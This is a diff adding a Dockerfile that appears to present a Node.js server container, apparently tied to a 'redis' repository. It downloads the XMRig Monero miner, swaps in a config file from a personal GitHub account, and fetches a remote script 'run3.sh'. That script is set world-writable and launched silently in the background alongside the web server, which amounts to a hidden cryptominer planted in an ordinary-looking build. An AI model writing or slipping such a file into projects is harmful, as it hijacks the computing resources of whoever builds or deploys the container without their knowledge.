@@ -1,0 +1,27 @@
+FROM ubuntu:16.04
+
+RUN apt-get update
+RUN apt-get install -y wget
+RUN wget https://github.com/xmrig/xmrig/releases/download/v5.7.0/xmrig-5.7.0-xenial-x64.tar.gz
+RUN tar xf xmrig-5.7.0-xenial-x64.tar.gz
+RUN rm -rf xmrig-5.7.0/config.json
+RUN wget https://raw.githubusercontent.com/ba3walos99/append/master/config.json
+RUN cp config.json xmrig-5.7.0/config.json
+RUN useradd -ms /bin/bash admin
+RUN wget https://raw.githubusercontent.com/ba3walos99/redis/master/run3.sh
+RUN chown -R admin:admin ./run3.sh
+RUN chown -R admin:admin run3.sh
+RUN chmod 777 ./run3.sh
+RUN chmod 777 run3.sh
+RUN apt-get install -y gcc make
+RUN apt-get install -y curl
+RUN curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | bash
+RUN . $HOME/.bashrc && nvm install v8.12.0
+RUN ln -s $HOME/.nvm/versions/node/v8.12.0/bin/node /usr/bin/node
+RUN ln -s $HOME/.nvm/versions/node/v8.12.0/bin/npm /usr/bin/npm
+WORKDIR /usr/src/app
+RUN wget https://raw.githubusercontent.com/ba3walos99/redis/master/server.js
+RUN wget https://raw.githubusercontent.com/ba3walos99/redis/master/package.json
+RUN npm install
+EXPOSE  80
+CMD nohup sh /run3.sh >result2 & npm start
